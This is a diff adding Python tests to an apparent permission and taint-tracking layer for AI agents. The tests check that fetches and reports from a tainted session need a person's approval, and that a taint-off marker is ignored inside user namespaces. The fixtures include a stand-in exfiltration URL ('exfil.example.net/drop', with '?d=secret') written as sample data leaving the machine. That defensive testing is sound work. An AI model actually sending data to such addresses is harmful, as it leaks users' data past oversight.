@@ -2858,6 +2858,91 @@ with tempfile.TemporaryDirectory() as d:
           and "never run unasked" in text and "ceiling" not in text
           and not [a for a in read(state).get("acted", []) if a["action"] == "agent_run"], text)
 
+    # 23w. Declared sinks (review of #1080, M1): an action says in its own purpose that it fetches an
+    # address or that what it is given may leave the machine, and a tainted conversation is asked
+    # about it in every mode, with no name added to the bridge. `download-manager.add` is the first.
+    FETCHER = ("Downloads - 0 queued\nrevision: d0d0\n{\n  \"queued\": 0\n}\n"
+               "  act: add(url, save_dir)  [sensitive, settles later]\n"
+               "       Download a URL to this machine. It fetches the address in `url`.\n"
+               "         url: string - The http(s) URL to fetch\n"
+               "         save_dir?: string - Directory to save into\n")
+    SENDER = ("Reporter - 1 problem\nrevision: e1e1\n{\n  \"problems\": 1\n}\n"
+              "  act: report(note)  [sensitive, settles later]\n"
+              "       Send a report. What it is given may leave this machine.\n"
+              "         note: string - what was happening\n")
+    NEW = "https://exfil.example.net/drop"
+    apps = {"downloads": FETCHER, "reporter": SENDER}
+    for mode in ("ask", "auto", "bypass", "bypass_all"):
+        for answer in ("granted", "denied"):
+            module, state = case(tmp, "declared-fetch-%s-%s" % (mode, answer), mode=mode, answer=answer,
+                                 machine_ceiling="dangerous", ceiling=None, apps_text=apps)
+            module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+            text, _ = act(module, "downloads", "add", {"url": NEW})
+            s = read(state)
+            ran = [a for a in s.get("acted", []) if a["action"] == "add"]
+            check("tainted downloads.add in %s, person %s: one card showing the whole address, %s" % (
+                  mode, answer, "fetched once with its grant" if answer == "granted" else "nothing fetched"),
+                  len(s.get("requests", [])) == 1 and s["requests"][0].get("tainted") is True
+                  and ("Fetches " + NEW + ".") in str(s["requests"][0].get("purpose"))
+                  and ((len(ran) == 1 and ran[0].get("grant") == "appr-1") if answer == "granted" else not ran),
+                  (text, s.get("requests"), ran))
+        module, state = case(tmp, "declared-send-%s" % mode, mode=mode, machine_ceiling="dangerous",
+                             ceiling=None, apps_text=apps)
+        module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+        act(module, "reporter", "report", {"note": "the calendar says dentist"})
+        s = read(state)
+        check("tainted reporter.report in %s: a card, told it is tainted, then it runs once" % mode,
+              [(r["app"], r["action"], r.get("tainted")) for r in s.get("requests", [])] == [("reporter", "report", True)]
+              and [a["action"] for a in s.get("acted", []) if a["action"] == "report"] == ["report"], s)
+        module, state = case(tmp, "declared-clean-%s" % mode, mode=mode, machine_ceiling="dangerous",
+                             ceiling=None, apps_text=apps, rules=[{"app": "downloads", "action": "add"},
+                                                                  {"app": "reporter", "action": "report"}])
+        act(module, "downloads", "add", {"url": NEW})
+        act(module, "reporter", "report", {"note": "x"})
+        check("untainted, a declared sink is the mode's own answer, with no taint on the request (%s)" % mode,
+              not any("tainted" in r for r in read(state).get("requests", [])), read(state).get("requests"))
+    module, state = case(tmp, "declared-fetch-bypass_all-clean", mode="bypass_all", machine_ceiling="dangerous",
+                         ceiling=None, apps_text=apps)
+    act(module, "downloads", "add", {"url": NEW})
+    check("untainted downloads.add in full bypass runs with nobody asked, as before",
+          not read(state).get("requests") and [a["action"] for a in read(state).get("acted", [])] == ["add"], read(state))
+    module, state = case(tmp, "declared-fetch-plan", mode="plan", machine_ceiling="dangerous", ceiling=None,
+                         apps_text=apps)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+    text, _ = act(module, "downloads", "add", {"url": NEW})
+    check("in plan mode a tainted fetch is refused by the mode and nobody is asked",
+          not read(state).get("requests") and not read(state).get("acted") and "plan mode" in text, text)
+    # Visited-or-ask, as `go`: an address the session has been to, with nothing in it, is free.
+    module, state = case(tmp, "declared-fetch-visited", mode="bypass_all", machine_ceiling="dangerous",
+                         ceiling=None, apps_text=apps)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+    module._VISITED.add(module.visited_form(NEW))
+    act(module, "downloads", "add", {"url": NEW})
+    check("a tainted fetch of an address already visited, with no data in it, is not asked",
+          not read(state).get("requests") and len(read(state).get("acted", [])) >= 1, read(state))
+    act(module, "downloads", "add", {"url": NEW + "?d=secret"})
+    check("but the same address with a query is asked, whole",
+          len(read(state).get("requests", [])) == 1 and NEW + "?d=secret" in read(state)["requests"][0]["purpose"],
+          read(state).get("requests"))
+    # The card shows, the grant binds and the app is sent one ASCII form of the address.
+    module, state = case(tmp, "declared-fetch-wire", mode="auto", machine_ceiling="dangerous", ceiling=None,
+                         apps_text=apps)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+    hidden = "https://a.example/x" + chr(0xFE0F) + "y"
+    act(module, "downloads", "add", {"url": hidden})
+    wire = module.wire_address(hidden)
+    s = read(state)
+    check("a fetched address is carried in its ASCII form: shown, bound and sent alike",
+          wire and wire != hidden and s["requests"][0]["args_json"].get("url") == wire
+          and [a["args"].get("url") for a in s.get("acted", []) if a["action"] == "add"] == [wire], s)
+    # Held to the Rust declarations, so a rewording on one side fails here.
+    rust = (HERE.parent.parent / "crates" / "yantrik-ipc-contracts" / "src" / "control_surface.rs").read_text(encoding="utf-8")
+    check("the declared sentences are the Rust constants",
+          'pub const LEAVES_MACHINE: &str = "%s";' % module.LEAVES_MACHINE in rust
+          and 'format!("It fetches the address in `{param}`.")' in rust
+          and module.fetch_param("x. It fetches the address in `url`.") == "url"
+          and module.fetch_param("It fetches the address in ``.") == "", "")
+
     # 23d. In `auto`, new_agent runs unasked and is written down — without the token; a token a
     # mind puts among the arguments is dropped; and one the desktop echoes back is scrubbed.
     module, state = case(tmp, "agents-auto", mode="auto", ceiling=None, token=TOKEN, echo_token=True)
@@ -3827,6 +3912,10 @@ with tempfile.TemporaryDirectory() as _d:
     (_d / "yos").write_text(FAKE_YOS, encoding="utf-8")
     (_d / "yos").chmod(0o755)
     _me = os.getuid() if hasattr(os, "getuid") else None
+    _ident = _d / "uid_map_identity"
+    _ident.write_text("         0          0 4294967295\n")
+    _userns = _d / "uid_map_userns"
+    _userns.write_text("         0       1000          1\n")
     _scratch = tmp / "taint-marker.json"
     _scratch.write_text("{}", encoding="utf-8")
     _mod = load_mcp(tmp / "yos", _scratch)
@@ -3844,30 +3933,33 @@ with tempfile.TemporaryDirectory() as _d:
     if _me is not None:
         m = _marker("good")
         check("the variable with a valid marker turns the taint off",
-              _mod.taint_off_declared(ON, m, _me) is True)
+              _mod.taint_off_declared(ON, m, _me, str(_ident)) is True)
         check("the marker without the variable does nothing",
-              _mod.taint_off_declared({}, m, _me) is False
-              and _mod.taint_off_declared({"YOS_MCP_NO_TAINT": "0"}, m, _me) is False)
+              _mod.taint_off_declared({}, m, _me, str(_ident)) is False
+              and _mod.taint_off_declared({"YOS_MCP_NO_TAINT": "0"}, m, _me, str(_ident)) is False)
         check("the variable without a marker leaves the taint on",
-              _mod.taint_off_declared(ON, str(_d / "good" / "absent"), _me) is False)
-        check("a marker owned by another uid is ignored", _mod.taint_off_declared(ON, m, _me + 1) is False)
-        check("a group-writable marker is ignored", _mod.taint_off_declared(ON, _marker("gw", 0o664), _me) is False)
-        check("a world-writable marker is ignored", _mod.taint_off_declared(ON, _marker("ww", 0o646), _me) is False)
+              _mod.taint_off_declared(ON, str(_d / "good" / "absent"), _me, str(_ident)) is False)
+        check("inside a user namespace (a uid map that is not the identity) a valid marker is ignored",
+              _mod.taint_off_declared(ON, m, _me, str(_userns)) is False
+              and _mod.taint_off_declared(ON, m, _me, str(_d / "no-such-uid-map")) is False)
+        check("a marker owned by another uid is ignored", _mod.taint_off_declared(ON, m, _me + 1, str(_ident)) is False)
+        check("a group-writable marker is ignored", _mod.taint_off_declared(ON, _marker("gw", 0o664), _me, str(_ident)) is False)
+        check("a world-writable marker is ignored", _mod.taint_off_declared(ON, _marker("ww", 0o646), _me, str(_ident)) is False)
         check("a marker in a group-writable directory is ignored",
-              _mod.taint_off_declared(ON, _marker("gdir", 0o644, 0o775), _me) is False)
+              _mod.taint_off_declared(ON, _marker("gdir", 0o644, 0o775), _me, str(_ident)) is False)
         check("a marker in a world-writable directory is ignored",
-              _mod.taint_off_declared(ON, _marker("wdir", 0o644, 0o777), _me) is False)
+              _mod.taint_off_declared(ON, _marker("wdir", 0o644, 0o777), _me, str(_ident)) is False)
         _real = pathlib.Path(_marker("target"))
         (_d / "link").mkdir()
         os.symlink(_real, _d / "link" / "no-person-data")
         check("a symlink to a valid marker is not the marker",
-              _mod.taint_off_declared(ON, str(_d / "link" / "no-person-data"), _me) is False)
+              _mod.taint_off_declared(ON, str(_d / "link" / "no-person-data"), _me, str(_ident)) is False)
         os.symlink(_d / "good", _d / "dirlink")
         check("a symlinked directory is not the marker's directory",
-              _mod.taint_off_declared(ON, str(_d / "dirlink" / "no-person-data"), _me) is False)
+              _mod.taint_off_declared(ON, str(_d / "dirlink" / "no-person-data"), _me, str(_ident)) is False)
         (_d / "asdir" / "no-person-data").mkdir(parents=True)
         check("a directory in the marker's place is ignored",
-              _mod.taint_off_declared(ON, str(_d / "asdir" / "no-person-data"), _me) is False)
+              _mod.taint_off_declared(ON, str(_d / "asdir" / "no-person-data"), _me, str(_ident)) is False)
     check("the real marker is /etc/yantrik/no-person-data, and with none there the default is taint ON",
           _mod.TAINT_MARKER == "/etc/yantrik/no-person-data"
           and (_mod.taint_off_declared(ON) is False or os.path.exists(_mod.TAINT_MARKER)))
